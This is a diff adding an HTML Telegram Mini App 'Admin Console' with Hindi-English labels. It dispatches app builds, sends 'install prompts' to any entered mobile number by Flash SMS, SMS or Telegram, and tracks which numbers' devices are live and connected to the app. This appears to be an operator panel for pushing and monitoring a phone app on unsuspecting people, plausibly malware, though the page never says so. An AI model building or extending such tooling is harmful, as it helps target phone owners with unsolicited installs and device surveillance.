@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Admin Console</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: var(--tg-theme-bg-color, #0e1621);
+      --sec: var(--tg-theme-secondary-bg-color, #17212b);
+      --text: var(--tg-theme-text-color, #fff);
+      --hint: var(--tg-theme-hint-color, #7d8b99);
+      --accent: var(--tg-theme-button-color, #2aabee);
+      --accent-text: var(--tg-theme-button-text-color, #fff);
+      --green: #4caf50; --red: #f44336; --amber: #ff9800;
+    }
+    body { background: var(--bg); color: var(--text); font-family: -apple-system, "Segoe UI", Roboto, sans-serif; }
+    .topbar { display: flex; align-items: center; gap: 12px; padding: 14px 16px; background: var(--sec); position: sticky; top: 0; z-index: 10; }
+    .logo { width: 40px; height: 40px; border-radius: 10px; background: var(--accent); color: var(--accent-text); display: flex; align-items: center; justify-content: center; font-size: 20px; }
+    .topbar h1 { font-size: 16px; }
+    .topbar p { font-size: 11px; color: var(--hint); }
+    .status-pill { margin-left: auto; font-size: 11px; padding: 5px 10px; border-radius: 20px; background: var(--sec); border: 1px solid var(--hint); color: var(--hint); }
+    .status-pill.live { color: var(--green); border-color: var(--green); }
+
+    .tabs { display: flex; background: var(--sec); border-bottom: 1px solid #222; overflow-x: auto; }
+    .tab { flex: 1; min-width: 72px; padding: 12px 8px; text-align: center; font-size: 12px; font-weight: 600; color: var(--hint); cursor: pointer; border-bottom: 2px solid transparent; white-space: nowrap; }
+    .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .tab .ico { display: block; font-size: 18px; margin-bottom: 3px; }
+
+    .content { padding: 16px; padding-bottom: 40px; }
+    .page { display: none; }
+    .page.active { display: block; animation: fade .18s ease; }
+    @keyframes fade { from { opacity: 0; transform: translateY(6px);} to { opacity: 1; transform: none;} }
+
+    .stat-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .stat { background: var(--sec); border-radius: 14px; padding: 16px; }
+    .stat .v { font-size: 28px; font-weight: 800; }
+    .stat .l { font-size: 11px; color: var(--hint); margin-top: 2px; }
+    .stat.green .v { color: var(--green); } .stat.red .v { color: var(--red); }
+
+    .card { background: var(--sec); border-radius: 14px; padding: 14px; margin-bottom: 12px; }
+    .card .t { font-size: 13px; font-weight: 700; margin-bottom: 10px; }
+    .row { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #222; }
+    .row:last-child { border-bottom: none; }
+    .row .k { font-size: 13px; }
+    .row .k small { display: block; color: var(--hint); font-size: 11px; }
+    .row .v { font-size: 13px; font-weight: 700; }
+
+    input, select { width: 100%; background: var(--sec); color: var(--text); border: 1px solid #2a3340; border-radius: 10px; padding: 13px; font-size: 15px; margin-bottom: 10px; font-family: inherit; }
+    input::placeholder { color: var(--hint); }
+    .btn { width: 100%; background: var(--accent); color: var(--accent-text); border: none; border-radius: 12px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: inherit; }
+    .btn:active { transform: scale(.98); }
+    .btn.ghost { background: transparent; border: 1px solid var(--accent); color: var(--accent); }
+    .btn.red { background: var(--red); }
+    .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(80px); background: var(--text); color: var(--bg); padding: 10px 18px; border-radius: 30px; font-size: 13px; opacity: 0; transition: all .3s; white-space: nowrap; z-index: 99; }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .log { background: #0a0f16; border-radius: 10px; padding: 12px; font-size: 12px; line-height: 1.6; max-height: 200px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <div class="logo">🎛️</div>
+    <div><h1>Admin Console</h1><p id="userLabel">Loading…</p></div>
+    <span class="status-pill" id="connPill">● connecting</span>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" data-page="dash"><span class="ico">📊</span>Dashboard</div>
+    <div class="tab" data-page="live"><span class="ico">📡</span>Live</div>
+    <div class="tab" data-page="install"><span class="ico">📲</span>Install</div>
+    <div class="tab" data-page="build"><span class="ico">🔨</span>Build</div>
+    <div class="tab" data-page="root"><span class="ico">⚙️</span>Root</div>
+  </div>
+
+  <div class="content">
+    <!-- Dashboard -->
+    <div class="page active" id="dash">
+      <div class="stat-row">
+        <div class="stat green"><div class="v" id="liveCount">—</div><div class="l">LIVE devices</div></div>
+        <div class="stat"><div class="v" id="rootNum">—</div><div class="l">Root number</div></div>
+      </div>
+      <div class="card" style="margin-top:12px">
+        <div class="t">System Status</div>
+        <div class="row"><span class="k">Backend</span><span class="v" style="color:var(--green)">🟢 Online</span></div>
+        <div class="row"><span class="k">Telegram Bot</span><span class="v" id="botStatus">Checking…</span></div>
+        <div class="row"><span class="k">SMS Provider</span><span class="v" id="smsProvider">—</span></div>
+      </div>
+      <button class="btn ghost" id="refreshBtn">🔄 Refresh</button>
+    </div>
+
+    <!-- Live Check -->
+    <div class="page" id="live">
+      <div class="card">
+        <div class="t">📡 Live Device Check</div>
+        <input id="liveNum" type="tel" maxlength="10" placeholder="Mobile number (98XXXXXXXX)">
+        <button class="btn" id="liveBtn">Check Status</button>
+      </div>
+      <div class="card" id="liveResult" style="display:none">
+        <div class="t" id="liveResultTitle">—</div>
+        <div id="liveResultBody"></div>
+      </div>
+    </div>
+
+    <!-- Install -->
+    <div class="page" id="install">
+      <div class="card">
+        <div class="t">📲 Send Install Prompt</div>
+        <input id="instNum" type="tel" maxlength="10" placeholder="Mobile number">
+        <div class="t" style="font-size:11px;color:var(--hint)">Channel</div>
+        <select id="instChannel">
+          <option value="both">🔀 Both (Flash + Telegram)</option>
+          <option value="flash">⚡ Flash SMS</option>
+          <option value="telegram">✈️ Telegram</option>
+          <option value="sms">📩 SMS</option>
+          <option value="auto">🤖 Auto</option>
+        </select>
+        <button class="btn" id="instBtn">Send Install</button>
+      </div>
+      <div class="card" id="instResult" style="display:none"><div class="t">Result</div><div id="instResultBody"></div></div>
+    </div>
+
+    <!-- Build -->
+    <div class="page" id="build">
+      <div class="card">
+        <div class="t">🔨 One-Click Build (GitHub Actions)</div>
+        <input id="buildVer" type="text" placeholder="Version (v1.0.0)">
+        <button class="btn" id="buildBtn">Start Build</button>
+        <div style="margin-top:12px"><div class="log" id="buildLog">Ready. Version daal ke Build dabao.</div></div>
+      </div>
+    </div>
+
+    <!-- Root -->
+    <div class="page" id="root">
+      <div class="card">
+        <div class="t">⚙️ Root Setup</div>
+        <input id="rootInput" type="tel" maxlength="10" placeholder="Root mobile number">
+        <button class="btn" id="rootBtn">Set Root Number</button>
+        <div style="margin-top:12px;font-size:12px;color:var(--hint)">Root number registered hone pe hi SMS/install kaam karega.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // CHANGE THIS to your real backend URL
+    const BACKEND = "https://localhost:8000";
+    let tg = window.Telegram?.WebApp;
+
+    function toast(m){ const t=document.getElementById('toast'); t.textContent=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1800); }
+    function api(path, opts={}){ return fetch(BACKEND+path, Object.assign({headers:{'Content-Type':'application/json'}}, opts)); }
+
+    // Tabs
+    document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>{
+      document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+      document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));
+      t.classList.add('active');
+      document.getElementById(t.dataset.page).classList.add('active');
+    }));
+
+    // Connection
+    async function setConn(){
+      try{
+        const r = await api('/api/health'); const d = await r.json();
+        document.getElementById('connPill').textContent='● live'; document.getElementById('connPill').classList.add('live');
+        document.getElementById('liveCount').textContent = d.live_devices ?? 0;
+      }catch(e){
+        document.getElementById('connPill').textContent='● offline';
+      }
+    }
+
+    async function loadRoot(){
+      try{ const d = await (await api('/api/root/setup')).json();
+        document.getElementById('rootNum').textContent = d.root_number || '❌';
+        document.getElementById('smsProvider').textContent = d.sms_provider || 'none';
+        document.getElementById('rootInput').value = d.root_number || '';
+      }catch(e){}
+    }
+
+    // Live check
+    document.getElementById('liveBtn').addEventListener('click', async ()=>{
+      const n=document.getElementById('liveNum').value.trim();
+      if(!/^\d{10}$/.test(n)){ toast('10 digit number daalo'); return; }
+      try{
+        const d = await (await api('/api/status/'+n)).json();
+        document.getElementById('liveResult').style.display='block';
+        if(d.live){ document.getElementById('liveResultTitle').innerHTML='🟢 <b>'+n+'</b> — LIVE'; document.getElementById('liveResultBody').textContent='Last seen: '+(d.last_seen_human||'abhi'); }
+        else{ document.getElementById('liveResultTitle').innerHTML='🔴 <b>'+n+'</b> — OFFLINE'; document.getElementById('liveResultBody').textContent='Device app se connected nahi hai.'; }
+      }catch(e){ toast('Backend error'); }
+    });
+
+    // Install
+    document.getElementById('instBtn').addEventListener('click', async ()=>{
+      const n=document.getElementById('instNum').value.trim();
+      const ch=document.getElementById('instChannel').value;
+      if(!/^\d{10}$/.test(n)){ toast('10 digit number daalo'); return; }
+      const btn=document.getElementById('instBtn'); btn.textContent='Sending…'; btn.disabled=true;
+      try{
+        const d = await (await api('/api/install',{method:'POST',body:JSON.stringify({number:n,channel:ch})})).json();
+        document.getElementById('instResult').style.display='block';
+        document.getElementById('instResultBody').innerHTML = d.deliveries.map(x=>{
+          const ok = x.ok ? '✅' : '❌'; return '<div class="row"><span class="k">'+x.channel+'</span><span class="v">'+ok+' '+(x.sent_to||x.kind||x.error||'')+'</span></div>';
+        }).join('');
+        toast('Install bhej diya');
+      }catch(e){ toast('Error'); } finally { btn.textContent='Send Install'; btn.disabled=false; }
+    });
+
+    // Build
+    document.getElementById('buildBtn').addEventListener('click', async ()=>{
+      const v=document.getElementById('buildVer').value.trim()||'v1.0.0';
+      const log=document.getElementById('buildLog'); log.textContent='Dispatch ho raha hai…';
+      try{
+        const d = await (await api('/api/build',{method:'POST',body:JSON.stringify({version:v})})).json();
+        if(d.ok){ log.textContent='✅ Build shuru! '+v+'\nGitHub Actions: github.com/…/actions'; }
+        else { log.textContent='⚠️ '+d.error; }
+      }catch(e){ log.textContent='⚠️ Error: '+e.message; }
+    });
+
+    // Root
+    document.getElementById('rootBtn').addEventListener('click', async ()=>{
+      const n=document.getElementById('rootInput').value.trim();
+      if(!/^\d{10}$/.test(n)){ toast('10 digit number daalo'); return; }
+      try{
+        const d = await (await api('/api/root/setup',{method:'POST',body:JSON.stringify({root_number:n})})).json();
+        toast('Root number set: '+n); loadRoot();
+      }catch(e){ toast('Error'); }
+    });
+
+    document.getElementById('refreshBtn').addEventListener('click', ()=>{ setConn(); loadRoot(); });
+
+    // Init
+    if(tg){ tg.ready(); tg.expand(); const u=tg.initDataUnsafe?.user; if(u) document.getElementById('userLabel').textContent=u.first_name+' (Admin)'; }
+    setConn(); loadRoot();
+  </script>
+</body>
+</html>
